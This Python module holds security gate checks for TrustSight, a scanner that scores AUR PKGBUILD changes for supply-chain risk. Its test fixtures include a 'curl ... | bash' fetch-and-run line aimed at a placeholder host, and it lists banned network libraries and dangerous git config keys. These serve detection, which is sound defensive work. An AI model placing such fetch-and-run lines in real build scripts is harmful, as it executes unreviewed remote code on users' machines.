"""Extracted from security_gates.py: _reporting."""

import ast
import re
from pathlib import Path
from scripts.gates._core import Gate, ROOT, SRC, _ANALYSIS_FETCH_ALLOWED, _BOUND_CONSTANTS, _INLINE_CODE_RE, _MD_LINK_RE, _PERMISSION_PHRASES, _PERMISSION_REGEXES, _anchor, _call_name, _demo_fact, _python_files, _rel, _render_inspect_text

__all__ = ['gate_alert_counts_reconcile', 'gate_alert_grouping_is_reported', 'gate_a_baseline_supplies_state_not_rules', 'gate_a_gap_is_always_shown_with_the_band', 'gate_change_entries_carry_no_severity', 'gate_content_findings_carry_a_location', 'gate_declared_findings_fire_under_shipped_config', 'gate_doc_cross_references_resolve', 'gate_every_input_bound_is_a_source_constant', 'gate_every_json_report_carries_the_fingerprint', 'gate_every_render_ends_with_a_direction', 'gate_flag_threshold_is_derived', 'gate_no_git_filters_or_hooks', 'gate_no_template_grants_permission', 'gate_positive_evidence_cannot_lower_a_fatal', 'gate_positive_evidence_never_scores', 'gate_reserved_names_are_refused_everywhere', 'gate_result_reports_what_changed', 'gate_score_is_deterministic_under_a_fingerprint', 'gate_source_urls_are_never_fetched', 'gate_suppression_is_never_hidden_by_a_flag', 'gate_the_default_output_is_not_headline_shaped']

def gate_a_gap_is_always_shown_with_the_band() -> Gate:
    """A reviewer never sees a bare band for an incomplete analysis.

    ``fail_closed`` lets a HIGH keep its band, which leaves the decoy
    move: pad past the cap, put the payload after the cut, and include
    one cheap deliberate HIGH in the visible prefix.  The verdict then
    reads "High" and the reviewer anchors on the decoy.  So the band a
    person is shown carries the caveat wherever it appears.
    """
    from trustsight.coverage import DIFF_TRUNCATED, INCOMPLETE_SUFFIX, qualified_band
    from trustsight.schema import PackageFact
    from trustsight.scoring import verdict_label, verdict_level

    problems = []
    for band in ("Low", "Medium", "High", "Critical"):
        if qualified_band(band, [DIFF_TRUNCATED]) != band + INCOMPLETE_SUFFIX:
            problems.append(f"{band} was shown bare despite a gap")
        if qualified_band(band, []) != band:
            problems.append(f"{band} was qualified without a gap")

    decoy = PackageFact(final_score=75, risk="High", coverage_gaps=[DIFF_TRUNCATED])
    if verdict_label(decoy) != "High" + INCOMPLETE_SUFFIX:
        problems.append("the decoy case rendered as a bare High")
    if verdict_level(decoy) != "High":
        problems.append("the machine-readable band was polluted with prose")

    # Every human-facing render must go through verdict_label, never
    # verdict_level: the two differ only here, so a display path using the
    # wrong one is exactly the regression this gate exists to catch.
    render_modules = ["cli/review.py"] + [
        str(p.relative_to(SRC))
        for p in sorted((SRC / "cli" / "inspect").rglob("*.py"))
    ]
    for module in render_modules:
        text = (SRC / module).read_text(encoding="utf-8")
        for lineno, line in enumerate(text.splitlines(), start=1):
            if "verdict_level(" in line and "risk_label" not in line and '"risk"' not in line:
                if "risk = verdict_level(fact)" not in line:
                    problems.append(f"{module}:{lineno} displays a bare band")
    return Gate("a coverage gap is always shown with the band", not problems, problems)

def gate_reserved_names_are_refused_everywhere() -> Gate:
    """No writer accepts a package name the rest of the code treats as internal.

    ``packages`` is guarded because ``upsert_package`` checks, but
    ``package_profiles`` and ``pkgbuild_snapshots`` are keyed by
    ``package_name`` directly and were not.  Both are on the
    ``import_baseline`` path, and AUR names may begin with an underscore,
    so ``__seed__`` is a name someone could register.  Every writer that
    takes a package name is checked here rather than three of them.
    """
    import trustsight.db as db

    from calibration_gates import shipped_config

    writers = [
        ("upsert_package", lambda n: db.upsert_package(n, "1.0")),
        ("save_package_profile", lambda n: db.save_package_profile(n, 1, "Low")),
        ("save_pkgbuild_snapshot", lambda n: db.save_pkgbuild_snapshot(n, "x", "1")),
    ]
    problems = []
    with shipped_config():
        db.init_db()
        for name in ("__seed__", "__evil", "__"):
            for label, call in writers:
                try:
                    call(name)
                    problems.append(f"{label} accepted {name!r}")
                except ValueError:
                    pass
        # ...and an ordinary name is still writable.
        for label, call in writers:
            try:
                call("ordinary-pkg")
            except ValueError:
                problems.append(f"{label} rejected an ordinary name")
    return Gate("reserved names are refused by every writer", not problems, problems)

def gate_a_baseline_supplies_state_not_rules() -> Gate:
    """A corpus baseline is prior state; it cannot change what a rule does.

    The importer writes package profiles, PKGBUILD snapshots and the
    metadata snapshot, and nothing else.  It never touches rules, weights,
    severities or thresholds, so a hostile-but-validly-signed baseline can
    make the present look unremarkable, exactly like a seed, but cannot
    change what any rule matches or what any finding is worth.
    """
    import trustsight.full_aur.export as export

    allowed_writers = {
        "save_package_profile", "save_pkgbuild_snapshot", "save_metadata",
    }
    forbidden = {
        "set_metadata", "load_rules", "sync_rules", "write_default_file",
        "add_override", "save_overrides",
    }
    tree = ast.parse((SRC / "full_aur" / "export.py").read_text(encoding="utf-8"))
    fn = next(
        node for node in ast.walk(tree)
        if isinstance(node, ast.FunctionDef) and node.name == "import_baseline"
    )
    problems = []
    for node in ast.walk(fn):
        if isinstance(node, ast.Call):
            name = _call_name(node).split(".")[-1]
            if name in forbidden:
                problems.append(f"import_baseline calls {name}()")
            # G004's prior dependency state is live observation, not
            # artifact content: a signed baseline that could set it would
            # let its author pre-seed "already seen" and suppress an
            # addition in the cycle after import (A13).
            if name == "save_pkgbuild_snapshot":
                for keyword in node.keywords:
                    if keyword.arg == "manifest_deps":
                        problems.append(
                            "import_baseline seeds manifest_deps")
    written = {
        _call_name(node).split(".")[-1]
        for node in ast.walk(fn)
        if isinstance(node, ast.Call)
    }
    if not (written & allowed_writers):
        problems.append("import_baseline writes nothing the gate recognises")
    if not hasattr(export, "InvalidSignatureError"):
        problems.append("the signature check is gone")
    return Gate("a baseline supplies state, not rules", not problems, problems)

def gate_source_urls_are_never_fetched() -> Gate:
    """Nothing derived from a PKGBUILD reaches a network call.

    Checked structurally, in two parts, because the analysis package is not
    transport-free: ``analysis/pipeline.py`` imports ``fetcher`` and calls
    ``clone_or_fetch`` to obtain the package's own AUR repository.  What
    holds is narrower and is what A2 actually promises.

    First, no raw transport library is imported, so the analysis package
    cannot open a connection of its own.  Second, everything it does import
    from a fetch module is on the name-keyed allowlist above: those take a
    package name or a commit id, never a URL, so a ``source=`` entry has
    nowhere to go.  Widening the allowlist with a URL-taking helper is the
    change that would reintroduce SSRF, and it fails here.
    """
    hits: list[str] = []
    banned = {"urllib.request", "http.client", "socket", "requests", "httpx", "ftplib"}
    fetch_modules = {"fetcher", "discovery", "full_aur.fetch", "full_aur.metadata"}
    for path in sorted((SRC / "analysis").rglob("*.py")):
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    if alias.name in banned:
                        hits.append(f"{_rel(path)}:{node.lineno} {alias.name}")
            elif isinstance(node, ast.ImportFrom):
                if node.module in banned:
                    hits.append(f"{_rel(path)}:{node.lineno} {node.module}")
                    continue
                # Relative imports inside the package: ".."-prefixed module
                # names arrive as the bare tail, e.g. "fetcher".
                if (node.module or "").lstrip(".") in fetch_modules:
                    for alias in node.names:
                        if alias.name not in _ANALYSIS_FETCH_ALLOWED:
                            hits.append(
                                f"{_rel(path)}:{node.lineno} "
                                f"{node.module}.{alias.name} is not name-keyed"
                            )
    return Gate("declared source URLs are never fetched", not hits, hits)

def gate_every_json_report_carries_the_fingerprint() -> Gate:
    """B1: every machine-readable report says which instrument made it.

    Run rather than read, because the claim is about what a consumer
    receives.  `review --json` built its own dict and carried it, while
    `inspect --json` went through `display._fact_to_dict`, which did not, so
    the guarantee was true of one command and false of the other.

    Both of those now render through `reporting.report_body` (B11), so that
    is what this checks: pointing it at the old per-command helper would
    leave it passing against a function no JSON path calls any more, which
    is the same mistake in a new place.  `schema.fact_to_dict` is checked
    beside it because it is the stored `fact_json`, a third consumer.
    """
    from trustsight.config import config_fingerprint
    from trustsight.reporting import evaluate_fact, report_body
    from trustsight.schema import fact_to_dict

    fact = _demo_fact()
    expected = config_fingerprint()
    evaluated = evaluate_fact(fact)
    missing = [
        name for name, data in (
            ("schema.fact_to_dict (stored fact_json)", fact_to_dict(fact)),
            ("reporting.report_body (default)", report_body(evaluated)),
            ("reporting.report_body (--score)",
             report_body(evaluated, include_score=True)),
        )
        if data.get("config_fingerprint") != expected
    ]
    return Gate("every JSON report carries the fingerprint", not missing, missing)

def gate_suppression_is_never_hidden_by_a_flag() -> Gate:
    """B5: a suppression is visible regardless of output flags or file type.

    `review --json` emitted `suppressed_rules` only under `--verbose`, so
    the default machine-readable output made a switched-off rule look
    exactly like one that never matched.  Asserted against the source of the
    JSON body: the key must not sit under a verbosity branch.  Companion URL
    acknowledgements are exercised too: R152 may disappear only while its
    acknowledgement remains visible.
    """
    path = SRC / "cli" / "review.py"
    tree = ast.parse(path.read_text(encoding="utf-8"))
    hits: list[str] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.If):
            continue
        test = ast.unparse(node.test)
        if "verbose" not in test and "quiet" not in test:
            continue
        for inner in ast.walk(node):
            if isinstance(inner, ast.Constant) and inner.value == "suppressed_rules":
                hits.append(f"{_rel(path)}:{inner.lineno} under `if {test}`")

    from unittest.mock import patch

    from trustsight.analysis import scan_diff
    from trustsight.override import SourceUrlAck

    ack = SourceUrlAck(
        package="demo", url="https://demo.github.io/docs/", reason="reviewed")
    diff = (
        "--- /dev/null\n+++ b/demo.service\n@@ -0,0 +1,2 @@\n"
        "+[Service]\n+Documentation=https://demo.github.io/docs/\n"
    )
    with patch("trustsight.override.load_url_acks", return_value=[ack]):
        fact = scan_diff(diff, package_name="demo")
    if any(e.rule_id == "R152" for e in fact.score_breakdown):
        hits.append("an acknowledged companion URL still fires R152")
    if not fact.acknowledged_urls:
        hits.append("R152 disappeared without a visible acknowledgement")
    return Gate("suppression is never hidden by a flag", not hits, hits)

def gate_the_default_output_is_not_headline_shaped() -> Gate:
    """The score is available on request, never volunteered.

    One of the guarantees in the opening list, and the only one with no
    structural check: the default render leads with evidence, and the number
    appears when `--score` or `--risk` asks for it.  A render that starts
    printing a band by default turns the tool into the verdict machine the
    thesis says it is not.
    """
    fact = _demo_fact(score=72)
    hits: list[str] = []
    for label, kwargs in (
        ("default", {}),
        ("--score", {"show_score": True}),
        ("--risk", {"show_risk": True}),
    ):
        text = _render_inspect_text(fact, **kwargs)
        leads = ("Score" in text) or ("/100" in text)
        if label == "default" and leads:
            hits.append("default inspect render volunteers the score")
        if label == "--score" and not leads:
            hits.append("--score does not show the score")
    return Gate("the default output is not headline-shaped", not hits, hits)

def gate_no_template_grants_permission() -> Gate:
    """B9: no rendered string says or implies that reading the diff is optional.

    Including when nothing fired.  The trivial case must state a fact, not
    issue a clearance: "Only pkgver and sha256sums changed. Review the diff
    before building."
    """
    import trustsight.findings as findings
    import trustsight.verdict as verdict

    problems = []
    # Template text only.  Substituted field values are package-controlled:
    # a package legitimately named `safe-rs` or `clean-arch` must not fail
    # the build.  This is A7's separation applied to B9, templates are
    # code-owned and checked, fields are package-owned and never checked.
    strings: list[tuple[str, str]] = [
        (f"findings.TEMPLATES[{k}]", v) for k, v in findings.TEMPLATES.items()
    ]
    for module in (verdict, findings):
        source = (SRC / Path(module.__file__).name).read_text(encoding="utf-8")
        tree = ast.parse(source)
        for node in ast.walk(tree):
            # Literal segments of an f-string are template text; the
            # interpolated values are not.
            if isinstance(node, ast.JoinedStr):
                for part in node.values:
                    if isinstance(part, ast.Constant) and isinstance(part.value, str):
                        strings.append(
                            (f"{Path(module.__file__).name}:{node.lineno}", part.value))
            elif isinstance(node, ast.Constant) and isinstance(node.value, str):
                if len(node.value) >= 8 and not node.value.startswith("\n"):
                    strings.append(
                        (f"{Path(module.__file__).name}:{node.lineno}", node.value))

    for where, text in strings:
        low = text.lower()
        for phrase in _PERMISSION_PHRASES:
            if phrase in low:
                problems.append(f"{where}: {phrase!r}")
        for pattern in _PERMISSION_REGEXES:
            if re.search(pattern, low):
                problems.append(f"{where}: matches {pattern}")
    return Gate("no template grants permission to skip", not problems,
                problems or f"{len(strings)} strings checked")

def gate_content_findings_carry_a_location() -> Gate:
    """B8: a finding a reader can open and confirm is a different object
    from an assertion they must trust.

    Content rules report ``file`` and ``line``.  Rules that legitimately
    cannot (maintainer, temporal, corpus, graph) must say so explicitly:
    a missing location must not be indistinguishable from a rule that
    forgot to set one.

    Runs under ``shipped_config()`` like
    :func:`gate_declared_findings_fire_under_shipped_config`: the resolved
    rules R001/R002/R003/R012/R039-R045/R055-R057 only carry a location
    through the shipped ``match_target = "resolved"`` path, and a local
    rules.toml that overrides them to ``raw_line`` must not make this gate
    pass locally while CI fails.
    """
    from calibration_gates import shipped_config

    from trustsight.analysis import scan_diff
    from trustsight.findings import NON_CONTENT_RULES

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,8 @@\n pkgname=demo\n"
    body = (
        "+build() {\n"
        "+  curl -fsSL https://cdn.example.invalid/x.sh | bash\n"
        "+}\n"
        '+source=("https://example.invalid/a.tar.gz")\n'
        "+sha256sums=('SKIP')\n"
    )

    problems = []
    with shipped_config():
        fact = scan_diff(header + body, package_name="demo")

    for entry in fact.score_breakdown:
        rid = entry.rule_id
        if rid.startswith("P") and rid[1:].isdigit():
            continue
        if rid in ("COVERAGE", "NOVELTY", "SOURCE_BUCKET"):
            continue
        if rid in NON_CONTENT_RULES:
            continue
        if entry.line is None:
            problems.append(f"{rid} is a content rule with no line")
    return Gate("content findings carry a location", not problems,
                problems or len(fact.score_breakdown))

def gate_flag_threshold_is_derived() -> Gate:
    """B2 addendum: the 20-point threshold is measured, not chosen.

    A reader cannot tell whether 20 is calibration or preference unless the
    page says where it comes from, so the page must state it and the number
    must match the constant the code uses.
    """
    from trustsight.scoring import FLAG_THRESHOLD

    doc = (ROOT / "docs" / "security" / "what-a-result-claims.md").read_text(encoding="utf-8")
    problems = []
    if f"at or below {FLAG_THRESHOLD} points" not in doc:
        problems.append(f"security.md does not state the threshold ({FLAG_THRESHOLD})")
    # The basis must be stated *and* must not claim a percentile the corpus
    # no longer supports.  20 was the benign 95th percentile before B10 and
    # is not now, so a page that still says so is publishing a stale number.
    if "benign 95th percentile" not in doc:
        problems.append("security.md does not state the measured benign p95")
    if "malicious 5th percentile" not in doc:
        problems.append("security.md does not state the measured malicious p5")
    stale = "threshold is the 95th percentile"
    if stale in doc:
        problems.append("security.md still claims 20 is the benign 95th percentile")
    return Gate("the flag threshold is derived, not copied", not problems,
                problems or FLAG_THRESHOLD)

def gate_result_reports_what_changed() -> Gate:
    """B7: every result carries a change summary, findings or not."""
    from trustsight.analysis import scan_diff
    from trustsight.schema import PackageFact
    from trustsight.changes import ALWAYS_NOISY, summarise

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n pkgname=demo\n"
    quiet = header + "-pkgver=1.2.3\n+pkgver=1.2.4\n"
    fact = scan_diff(quiet, package_name="demo")

    problems = []
    if not fact.changes:
        problems.append("a result with no findings reported no changes either")
    if not any("1.2.4" in c for c in fact.changes):
        problems.append("the version move was not reported")
    # Always-noisy files must not be listed.
    noisy = PackageFact()
    noisy.diff_summary.file_changes = [{"path": p, "status": "modified"}
                                       for p in ALWAYS_NOISY]
    if any(p in " ".join(summarise(noisy)) for p in ALWAYS_NOISY):
        problems.append("a always-noisy file was listed")
    return Gate("a result reports what changed", not problems,
                problems or fact.changes)

def gate_change_entries_carry_no_severity() -> Gate:
    """B7: changes are context, not findings.

    They must never acquire a severity, a weight, or a place in
    ``triggered_rules``; conflating the two would corrupt the calibration
    and the reader's sense of what a finding means.
    """
    from trustsight.analysis import scan_diff

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n pkgname=demo\n"
    fact = scan_diff(header + "-pkgver=1\n+pkgver=2\n+source=(\"https://x.invalid/a\")\n",
                     package_name="demo")
    problems = []
    if not all(isinstance(c, str) for c in fact.changes):
        problems.append("a change entry is not a plain string")
    fired = {e.rule_id for e in fact.score_breakdown}
    if any(c in fired for c in fact.changes):
        problems.append("a change entry reached the score breakdown")
    return Gate("change entries carry no severity", not problems,
                problems or len(fact.changes))

def gate_positive_evidence_never_scores() -> Gate:
    """B10: declared practice is reported, never credited."""
    from trustsight.schema import NoveltyContext
    from trustsight.scoring import calculate_score

    maximal = dict(
        verification_evidence=["checksum_present", "validpgpkeys_declared",
                               "gpg_verify_present"],
        pinning_level="checksum_pinned",
    )
    buckets = {"https://github.com/a/b.tar.gz": "trusted_forge"}
    triggered = [{"rule_id": "R001", "severity": "HIGH", "name": "x", "match": ""}]

    bare, _, _ = calculate_score(triggered, {}, NoveltyContext())
    rich, breakdown, _ = calculate_score(triggered, buckets, NoveltyContext(), **maximal)

    problems = []
    if rich != bare:
        problems.append(f"declared evidence moved the score: {bare} -> {rich}")
    positives = [e for e in breakdown
                 if e.rule_id.startswith("P") and e.rule_id[1:].isdigit()]
    if not positives:
        problems.append("no declared-practice finding was emitted")
    for entry in positives:
        if entry.weight != 0 or entry.severity != "INFO":
            problems.append(f"{entry.rule_id} is {entry.severity} weight {entry.weight}")
    return Gate("positive evidence never changes the score", not problems,
                problems or sorted(e.rule_id for e in positives))

def gate_declared_findings_fire_under_shipped_config() -> Gate:
    """Every declared-practice finding is reachable with the config that ships.

    P007 was emitted from inside an ``if modifier < 0`` branch.  When B10
    set ``trusted_forge = 0`` the branch became unreachable, so the finding
    stopped existing in production while still firing in the test suite,
    whose fixture config still carried the old ``-10``.  Seven documentation
    pages described a finding that could not occur.

    This is the entry-point failure from
    [reviewing a security control](../docs/contributing/security-review.md)
    wearing a different hat: the check pointed at a configuration the tool
    does not use.  So the reachability check runs against the shipped
    config, in a temp dir, with a cold database, and uses one recipe per
    practice rather than one recipe for all of them: a single PKGBUILD
    cannot be both commit-pinned and tag-pinned, and mixing checksummed and
    SKIP sources suppresses the checksum evidence entirely.
    """
    from calibration_gates import shipped_config

    from trustsight.analysis import scan_diff
    from trustsight.config import load_config, load_rules
    from trustsight.scoring import DECLARED_REASONS

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,8 @@\n pkgname=demo\n"
    digest = "3b1f8a2c9d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8"
    recipes = {
        # A checksummed tarball is "checksums declared"; it is not a commit
        # pin, so P005 has its own recipe below.
        "P001": header + f'+source=("https://ex.invalid/d-1.tar.gz")\n+sha256sums=(\'{digest}\')\n',
        # A VCS source pinned to one commit.  P005 is now only reachable this
        # way: a checksum-pinned tarball used to report a commit pin it did
        # not have.
        "P005": header + '+source=("git+https://ex.invalid/d.git#commit='
                + "a" * 40 + '")\n',
        "P002": header + '+validpgpkeys=(\'ABCDEF0123456789ABCDEF0123456789ABCDEF01\')\n',
        "P003": header + '+  gpg --verify d.tar.gz.asc\n',
        # A versioned path with no digest: pinned to a tag, which is the
        # weaker form, since a tag can be repointed.
        "P006": header + '+source=("https://ex.invalid/d/archive/v1.2.3.tar.gz")\n+sha256sums=(\'SKIP\')\n',
        "P007": header + '+source=("https://github.com/d/d/archive/v1.tar.gz")\n',
        # A branch ref: makepkg resolves it when the package is built, so
        # what this compiles is whatever upstream has published by then.
        "P008": header + '+source=("git+https://ex.invalid/d.git#branch=main")\n',
        # A prebuilt artifact: the recipe ships what upstream built, so the
        # name and the source both declare it.
        "P009": header + '+source=("https://ex.invalid/d.AppImage")\n',
    }

    # P009 is a declared fact of the recipe text, so it needs the full head
    # recipe the way the CLI and analysis paths pass it.
    current_texts = {
        "P009": 'pkgname=demo\npkgrel=1\nsource=("https://ex.invalid/d.AppImage")\n',
    }

    problems = []
    fired: dict[str, bool] = {}
    with shipped_config():
        config, rules = load_config(), load_rules()
        for expected, diff in recipes.items():
            fact = scan_diff(diff, rules=rules, config=config, package_name="demo",
                             current_text=current_texts.get(expected))
            seen = {e.rule_id for e in fact.score_breakdown}
            fired[expected] = expected in seen
            if expected not in seen:
                problems.append(f"{expected} unreachable: got {sorted(seen)}")
            for entry in fact.score_breakdown:
                if entry.rule_id in DECLARED_REASONS and entry.weight != 0:
                    problems.append(f"{entry.rule_id} carries weight {entry.weight}")

    undocumented = sorted(set(DECLARED_REASONS) - set(recipes))
    if undocumented:
        problems.append(f"no reachability recipe for {undocumented}")
    return Gate("declared findings fire under the shipped config",
                not problems, problems or sorted(fired))

def gate_positive_evidence_cannot_lower_a_fatal() -> Gate:
    """B10 + B4, stated as the attack: sign the package, then steal.

    A FATAL finding contributes weight 0, so maximal declared evidence can
    no longer be accused of "lowering" a FATAL-capped 100 — the invariant
    that remains: positive evidence must not change the score, the band, or
    the presence of the FATAL entry in the breakdown, whatever the declared
    verification practices say.
    """
    from trustsight.schema import NoveltyContext
    from trustsight.scoring import calculate_score

    triggered = [{"rule_id": "R012", "severity": "FATAL", "name": "injection",
                  "match": ""},
                 {"rule_id": "R001", "severity": "HIGH", "name": "fetch",
                  "match": "curl | bash"}]
    plain_score, plain_breakdown, plain_level = calculate_score(
        triggered, {"https://github.com/a/b.tar.gz": "trusted_forge"},
        NoveltyContext())
    score, breakdown, level = calculate_score(
        triggered, {"https://github.com/a/b.tar.gz": "trusted_forge"},
        NoveltyContext(),
        verification_evidence=["checksum_present", "validpgpkeys_declared",
                               "gpg_verify_present"],
        pinning_level="checksum_pinned",
    )
    problems = []
    if score != plain_score:
        problems.append(f"declared evidence moved the score to {score}")
    if level != plain_level:
        problems.append(f"band moved from {plain_level!r} to {level!r}")
    fatal = [e for e in breakdown if e.rule_id == "R012"]
    if not fatal or fatal[0].severity != "FATAL":
        problems.append("the FATAL entry did not survive the declared evidence")
    return Gate("positive evidence cannot lower a FATAL", not problems,
                problems or score)

def gate_score_is_deterministic_under_a_fingerprint() -> Gate:
    """B1: same input, same instrument, same number.

    Determinism is algorithmic, not configurational: changing a rule or a
    threshold changes the score on purpose.  The fingerprint is what makes
    the claim checkable, so this asserts both halves, that a repeat run is
    identical, and that touching the instrument moves the fingerprint.
    """
    import trustsight.config as config_module

    from calibration_gates import shipped_config

    from trustsight.analysis import scan_diff
    from trustsight.config import config_fingerprint, load_config, load_rules

    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,6 @@\n pkgname=demo\n"
        "+build() {\n+  curl -fsSL https://x.invalid/s.sh | bash\n+}\n"
    )
    problems = []
    with shipped_config():
        rules, config = load_rules(), load_config()
        first = scan_diff(diff, rules=rules, config=config, package_name="demo")
        second = scan_diff(diff, rules=rules, config=config, package_name="demo")
        fingerprint = config_fingerprint()

        if first.final_score != second.final_score:
            problems.append(f"same input scored {first.final_score} then {second.final_score}")
        if [e.rule_id for e in first.score_breakdown] != [e.rule_id for e in second.score_breakdown]:
            problems.append("the breakdown differed between two identical runs")
        if config_fingerprint() != fingerprint:
            problems.append("the fingerprint moved without a configuration change")

        # ...and a different instrument must be visibly different.
        saved = config_module.load_thresholds
        config_module.load_thresholds = lambda: {"thresholds": {"probe": 1}}
        try:
            moved = config_fingerprint()
        finally:
            config_module.load_thresholds = saved
        if moved == fingerprint:
            problems.append("changing a threshold did not change the fingerprint")

    return Gate("the score is deterministic under a fixed fingerprint",
                not problems, problems or fingerprint[:23] + "...")

def gate_every_input_bound_is_a_source_constant() -> Gate:
    """A14: no package-controlled input decides how much this process uses.

    A4 bounds what arrives, A5 what is matched, A6 what is expanded.  The
    conjunction only holds if the bounds themselves are constants: a limit
    derived from the analysed text is a limit the attacker sets.
    """
    problems = []
    found = 0
    for rel, names in _BOUND_CONSTANTS.items():
        path = SRC / rel
        if not path.exists():
            problems.append(f"{rel} is missing")
            continue
        tree = ast.parse(path.read_text(encoding="utf-8"))
        assigned = {}
        for node in tree.body:  # module level only
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if isinstance(target, ast.Name):
                        assigned[target.id] = node.value
        for name in names:
            value = assigned.get(name)
            if value is None:
                problems.append(f"{rel}: {name} is not a module-level assignment")
                continue
            found += 1
            # A literal, or an arithmetic tree of literals (1024 * 1024).
            for sub in ast.walk(value):
                if isinstance(sub, (ast.Name, ast.Call, ast.Attribute, ast.Subscript)):
                    problems.append(f"{rel}: {name} is computed, not a literal")
                    break
    return Gate("every input bound is a source constant", not problems,
                problems or found)

def gate_every_render_ends_with_a_direction() -> Gate:
    """B9, structurally: something must be there, rather than something absent.

    A denylist over phrasings is a treadmill; a wording nobody anticipated
    slips past it.  Requiring a direction to review cannot be bypassed by
    creative rewording, because the check fails when the direction is
    missing however the rest of the sentence reads.
    """
    from trustsight.schema import DiffSummary, PackageFact, ScoreEntry
    from trustsight.verdict import DIRECTIONS, fallback_verdict

    cases = {
        "first analysis, no versions": PackageFact(first_seen=True),
        "first analysis": PackageFact(first_seen=True, old_version="1", new_version="2"),
        "nothing fired": PackageFact(diff_summary=DiffSummary(files_changed=["PKGBUILD"])),
        "signals fired": PackageFact(
            diff_summary=DiffSummary(files_changed=["PKGBUILD"]),
            score_breakdown=[ScoreEntry(rule_id="R001", severity="HIGH", weight=25,
                                        reason="x")]),
        "fatal": PackageFact(
            diff_summary=DiffSummary(files_changed=["PKGBUILD"]),
            score_breakdown=[ScoreEntry(rule_id="R012", severity="FATAL", weight=0,
                                        reason="x")]),
    }
    problems = []
    for label, fact in cases.items():
        verdict = fallback_verdict(fact).rstrip()
        if not verdict.endswith(DIRECTIONS):
            problems.append(f"{label}: ends {verdict[-48:]!r}")
    return Gate("every result render ends with a direction to review",
                not problems, problems or sorted(cases))

def gate_no_git_filters_or_hooks() -> Gate:
    """A3: cloning executes nothing.

    libgit2 does not run git hooks on clone, and this project configures no
    ``clean``, ``smudge`` or ``fsmonitor`` filter, which are the
    git-config-driven paths where a fetch can otherwise become an
    execution.  This documents a property the library has rather than a
    control this project adds.
    """
    dangerous = ("core.fsmonitor", "filter.", "core.hooksPath", "core.hookspath",
                 "uploadpack.packObjectsHook", "diff.external", "core.pager")
    hits = []
    for path in _python_files():
        text = path.read_text(encoding="utf-8")
        for lineno, line in enumerate(text.splitlines(), start=1):
            for key in dangerous:
                if key in line and not line.lstrip().startswith("#"):
                    hits.append(f"{_rel(path)}:{lineno} {key}")
        tree = ast.parse(text)
        for node in ast.walk(tree):
            # A write to a *git* config, which is `repo.config[...] = ...`
            # or a set_multivar on it.  TrustSight's own `set_config`, which
            # writes config.toml, is not this and must not be flagged.
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if (isinstance(target, ast.Subscript)
                            and isinstance(target.value, ast.Attribute)
                            and target.value.attr == "config"):
                        hits.append(f"{_rel(path)}:{node.lineno} writes git config")
            if isinstance(node, ast.Call) and _call_name(node).endswith(
                    ("config.set_multivar", "config.add_file")):
                hits.append(f"{_rel(path)}:{node.lineno} writes git config")
    return Gate("no git filters or hooks are configured", not hits, hits)

def gate_doc_cross_references_resolve() -> Gate:
    """Every link between the docs points at a file and anchor that exist.

    This is the documentation-level form of the failure B2 exists to
    prevent: renaming a heading leaves every sentence on the page true,
    and quietly breaks the links that connect one claim to another, with
    nothing failing anywhere.  It nearly happened to this model when B2's
    own heading was reworded, and heading rewording is *likely* on a page
    people keep polishing.  Eight files reference each other, so the
    check covers all of ``docs/``, not just ``security.md``.
    """
    docs = ROOT / "docs"
    if not docs.exists():
        return Gate("doc cross-references resolve", False, "docs/ is missing")

    anchors: dict[Path, set[str]] = {}
    for path in docs.rglob("*.md"):
        found = set()
        fenced = False
        for line in path.read_text(encoding="utf-8").splitlines():
            if line.lstrip().startswith("```"):
                fenced = not fenced
            elif not fenced and line.startswith("#"):
                found.add(_anchor(line))
        anchors[path.resolve()] = found

    broken: list[str] = []
    for path in sorted(docs.rglob("*.md")):
        fenced = False
        for lineno, line in enumerate(path.read_text(encoding="utf-8").splitlines(), start=1):
            if line.lstrip().startswith("```"):
                fenced = not fenced
                continue
            if fenced:
                continue
            # Inline code is not markup.  A rule pattern such as
            # `(?<![^\x00-\x7F])[...]` contains `](...)` and reads as a
            # link to a regex fragment otherwise.
            for target in _MD_LINK_RE.findall(_INLINE_CODE_RE.sub("`code`", line)):
                if target.startswith(("http://", "https://", "mailto:")):
                    continue
                file_part, _, anchor = target.partition("#")
                if file_part:
                    dest = (path.parent / file_part).resolve()
                    if not dest.exists():
                        broken.append(f"{_rel(path)}:{lineno} -> {target} (no such file)")
                        continue
                else:
                    dest = path.resolve()
                if anchor and anchor not in anchors.get(dest, set()):
                    broken.append(f"{_rel(path)}:{lineno} -> {target} (no such anchor)")

    checked = sum(len(v) for v in anchors.values())
    return Gate("doc cross-references resolve", not broken,
                broken or f"{checked} anchors across {len(anchors)} files")


def gate_alert_grouping_is_reported() -> Gate:
    """§1: a capped render is reported, never silent (B5/B11).

    When a run produces more findings than the terminal shows, the boundary
    W010 must appear and become a SATURATED boundary; a silent grouping is
    the "computing and hiding" failure the alert-budget guard exists to
    prevent.
    """
    from trustsight.analysis.meta import alert_volume_finding
    from trustsight.boundaries import BoundaryKind, boundaries_from_fact
    from trustsight.schema import PackageFact, ScoreEntry

    problems: list[str] = []
    cap = 5
    rules = [{"rule_id": f"C{i:03d}", "severity": "HIGH", "category": "x"}
             for i in range(cap + 3)]
    config = {"alerts": {"max_rendered_findings": cap},
              "severity_weights": {"HIGH": 25, "INFO": 0}}
    finding = alert_volume_finding(rules, config)
    if not finding or finding.get("rule_id") != "W010":
        return Gate("alert grouping is reported", False,
                    "no W010 above the render cap")

    entry = ScoreEntry(rule_id="W010", severity="INFO", weight=0,
                       reason=finding.get("match", ""))
    fact = PackageFact(package_name="demo", score_breakdown=[entry])
    kinds = {b.kind for b in boundaries_from_fact(fact)}
    if BoundaryKind.SATURATED not in kinds:
        problems.append("W010 did not become a SATURATED boundary")
    if any(b.kind == BoundaryKind.SATURATED and b.forbids_clean
           for b in boundaries_from_fact(fact)):
        problems.append("the saturation boundary forbade a clean verdict")
